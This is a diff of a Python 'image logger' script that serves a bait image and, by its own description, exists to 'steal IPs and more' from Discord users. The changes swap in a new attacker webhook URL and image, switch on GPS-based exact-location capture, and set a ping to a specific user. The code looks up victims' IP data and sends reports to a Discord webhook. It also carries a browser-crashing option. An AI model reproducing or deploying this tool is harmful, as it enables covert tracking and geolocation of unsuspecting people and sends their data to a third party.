@@ -1,19 +1,18 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+## by luakiller
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__app__ = "Image Logger"
+__description__ = "Someone just got Image Logged!"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1129514071549558824/UmwIgaVe36TQ27m_jJJf8gi1ZXu0ceLQggh7FKigwH8UoYHc0Di3AIqcotZTEaSNQDS-",
-    "image": "https://beautifuldawndesigns.net/wp-content/uploads/2022/04/anime-girl-drawing4-1.jpeg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1129733322092859393/Wy32g2UfH1VPKkaTRVQLyJOree1z42zrd2Gd3WSxU2LA5nqqLLz5BtnKTX1CAiaNf2r_",
+    "image": "https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/0/4/8/048a41b5bbd9413f3de6e4c0883bb31c9b2ccd46.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -24,7 +23,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
@@ -107,7 +106,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
-    ping = "@everyone"
+    ping = "<@1078703918466474034>"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
